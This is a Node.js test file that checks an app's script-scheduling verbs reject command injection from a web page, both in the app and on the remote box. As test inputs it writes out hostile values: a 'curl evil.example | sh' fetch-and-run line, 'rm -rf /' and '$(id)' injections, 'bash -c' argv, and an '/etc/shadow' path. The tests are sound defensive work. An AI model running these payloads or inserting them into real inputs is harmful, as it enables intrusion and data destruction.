// scripts-verbs.test.mjs — the app's three Scripts verbs (scripts-list,
// scripts-save, script-run) and the rule they exist to keep: a page cannot
// inject a command. Spec docs/superpowers/specs/2026-10-17-adopt-existing-server.md
// § Scripts on a schedule: "There is no box in the app to type a command into."
//   node --test wizard/panel/scripts-verbs.test.mjs
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { writeFileSync, readFileSync, mkdirSync, chmodSync } from 'node:fs';
import { join } from 'node:path';
import { execFileSync } from 'node:child_process';
import { EventEmitter } from 'node:events';
import { createPanelServer, MEMBER_VERBS } from './panel-server.mjs';
import { LOCAL_VERBS } from './local-verbs.mjs';
import { tmpDir } from '../../tests/tmp-dir.mjs';

const ENGINE = join(import.meta.dirname, '..', '..', 'engine');
const b64 = (o) => Buffer.from(JSON.stringify(o), 'utf8').toString('base64');
const build = (verb, args) => MEMBER_VERBS[verb].build(args);

test('the three verbs exist, two of them mutate, and the local face has none of them', () => {
  for (const v of ['scripts-list', 'scripts-save', 'script-run']) assert.ok(MEMBER_VERBS[v], `${v} missing`);
  assert.ok(!MEMBER_VERBS['scripts-list'].mutating);
  assert.ok(MEMBER_VERBS['scripts-save'].mutating);
  assert.ok(MEMBER_VERBS['script-run'].mutating);
  for (const v of ['scripts-list', 'scripts-save', 'script-run']) assert.ok(!LOCAL_VERBS[v], `${v} must not reach a folder on this computer`);
});

test('no verb takes a command: nothing named script* or cadence* accepts argv, cmd or command', () => {
  for (const [name, spec] of Object.entries(MEMBER_VERBS)) {
    if (!/^(scripts?|cadence)-/.test(name)) continue;
    for (const k of ['argv', 'cmd', 'command', 'program']) {
      let out = '';
      try { const r = spec.build({ [k]: 'curl evil.example | sh', id: 'money-state', changes_b64: b64({ 'money-state': { [k]: ['curl'] } }) }); out = `${r.command}\n${r.stdin || ''}`; }
      catch { continue; }   // refusing is the right answer
      assert.ok(!out.includes('evil.example'), `${name} carried a page-supplied ${k} to the box`);
      assert.ok(!Buffer.from(String(out.split('\n')[1] || ''), 'base64').toString('utf8').includes('curl'), `${name} carried a page-supplied ${k} on stdin`);
    }
  }
});

test('scripts-save refuses every field but enabled, schedule and remove, before anything leaves the computer', () => {
  const ok = build('scripts-save', { changes_b64: b64({ 'money-state': { enabled: true, schedule: { kind: 'every', minutes: 5, quiet: false } } }) });
  assert.match(ok.command, /scripts\.mjs \/state save$/);
  for (const evil of [
    { 'money-state': { argv: ['bash', '-c', 'id'] } },
    { 'money-state': { cwd: '/' } },
    { 'money-state': { env_file: '/etc/shadow' } },
    { 'money-state': { timeout_s: 1 } },
    { 'x; rm -rf /': { enabled: true } },
    { 'money-state': { enabled: true, schedule: { kind: 'every', minutes: 0 } } },
  ]) {
    assert.throws(() => build('scripts-save', { changes_b64: b64(evil) }), (e) => e.status === 400, JSON.stringify(evil));
  }
  assert.throws(() => build('scripts-save', { changes_b64: '' }), /base64/);
  assert.throws(() => build('scripts-save', { changes_b64: 'not*base64!' }), /base64/);
  assert.throws(() => build('scripts-save', { changes_b64: Buffer.from('{oops').toString('base64') }), /JSON/);
});

test('what reaches the box on stdin is the validated object, re-encoded, never the caller bytes', () => {
  // Same JSON value, odd bytes: whitespace and a BOM-free key order the box
  // would accept either way. The stdin must be the canonical re-encoding.
  const raw = Buffer.from('{ "money-state" :  {"enabled":false} }').toString('base64');
  const r = build('scripts-save', { changes_b64: raw });
  assert.equal(r.stdin.trim(), b64({ 'money-state': { enabled: false } }));
  assert.ok(!r.command.includes(raw), 'the payload rides stdin, never the command line');
});

test('script-run takes a kebab id only; anything shell-shaped is refused', () => {
  assert.match(build('script-run', { id: 'money-state' }).command, /scripts\.mjs \/state run money-state$/);
  for (const id of ['money-state; id', '$(id)', '`id`', '../x', 'Money', '', 'a b']) {
    assert.throws(() => build('script-run', { id }), /kebab-case/, id);
  }
  assert.ok(MEMBER_VERBS['script-run'].timeoutMs >= 50000, 'Run now waits for a short script to finish');
});

test('cadence-list carries the Scripts list, so the Skills page and Health card need one round trip', () => {
  const cmd = build('cadence-list', {}).command;
  const at = cmd.indexOf('__SCRIPTS__');
  assert.ok(at > cmd.indexOf('__PLANJSON__'), '__SCRIPTS__ comes after __PLANJSON__');
  assert.match(cmd.slice(at), /scripts\.mjs \/state list/);
  assert.match(cmd.slice(at), /engine-too-old/, 'an older image answers with an honest empty state');
});

// The box half of the same rule, run for real: the command the app builds,
// pointed at a scratch /state, with a crafted stdin that skipped the app's own
// check. The box refuses it and the file is unchanged.
test('even a stdin that bypassed the app is refused on the box, and switching on a missing program is refused', () => {
  const state = tmpDir('scripts-verb-');
  mkdirSync(join(state, 'cockpit'), { recursive: true });
  writeFileSync(join(state, 'ok.sh'), '#!/bin/sh\necho ok\n'); chmodSync(join(state, 'ok.sh'), 0o755);
  const file = { version: 1, scripts: {
    'money-state': { enabled: false, argv: [join(state, 'ok.sh')], cwd: state, schedule: { kind: 'every', minutes: 15 }, timeout_s: 30 },
    bridge: { enabled: false, argv: ['/opt/nowhere/bridge'], cwd: state, schedule: { kind: 'every', minutes: 5 }, timeout_s: 30 },
  } };
  writeFileSync(join(state, 'cockpit', 'scripts.json'), JSON.stringify(file));
  const before = readFileSync(join(state, 'cockpit', 'scripts.json'), 'utf8');
  const cmd = build('scripts-save', { changes_b64: b64({ 'money-state': { enabled: true } }) }).command
    .replaceAll('/app/engine', ENGINE).replaceAll(' /state ', ` ${state} `);
  const runWith = (stdin) => { try { return execFileSync('bash', ['-c', cmd], { input: stdin, encoding: 'utf8' }); } catch (e) { return `EXIT${e.status}:${e.stdout}`; } };
  const injected = runWith(b64({ 'money-state': { argv: ['bash', '-c', 'touch /tmp/pwned'] } }) + '\n');
  assert.match(injected, /^EXIT1:ERROR: argv cannot be changed from the app/);
  assert.equal(readFileSync(join(state, 'cockpit', 'scripts.json'), 'utf8'), before);
  const missing = runWith(b64({ bridge: { enabled: true } }) + '\n');
  assert.match(missing, /^EXIT1:ERROR: bridge cannot be switched on: \/opt\/nowhere\/bridge is not installed inside your mineral/);
  assert.equal(readFileSync(join(state, 'cockpit', 'scripts.json'), 'utf8'), before);
  const fine = runWith(b64({ 'money-state': { enabled: true } }) + '\n');
  assert.match(fine, /OK: scripts saved/);
  assert.equal(JSON.parse(readFileSync(join(state, 'cockpit', 'scripts.json'), 'utf8')).scripts['money-state'].enabled, true);
});

// Through the real server: a bad body is a 400 and never reaches the bridge.
function fakeBridge(targets) {
  const ran = [];
  return {
    ran,
    targets: () => targets,
    stream: (host, command, o = {}) => {
      ran.push({ host, command, stdin: o.stdin });
      const p = new EventEmitter(); p.kill = () => {};
      setImmediate(() => p.emit('close', 0));
      return p;
    },
  };
}
test('over HTTP: an injected scripts-save is a 400 and nothing is dialled', async () => {
  const bridge = fakeBridge([{ host: 'jane01-box', org: 'jane01', kind: 'member' }]);
  const s = createPanelServer({ port: 0, host: '127.0.0.1', htmlText: '<html>x</html>', bridge });
  await new Promise((r) => s.on('listening', r));
  const post = (body) => fetch(`http://127.0.0.1:${s.address().port}/run`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(body) });
  try {
    const bad = await post({ host: 'jane01-box', verb: 'scripts-save', args: { changes_b64: b64({ 'money-state': { argv: ['id'] } }) } });
    assert.equal(bad.status, 400);
    assert.equal(bridge.ran.length, 0, 'a refused verb never reaches the mineral');
    const good = await post({ host: 'jane01-box', verb: 'scripts-save', args: { changes_b64: b64({ 'money-state': { enabled: false } }) } });
    assert.equal(good.status, 200);
    await good.text();
    assert.equal(bridge.ran.length, 1);
    assert.equal(bridge.ran[0].stdin.trim(), b64({ 'money-state': { enabled: false } }));
  } finally { s.close(); }
});
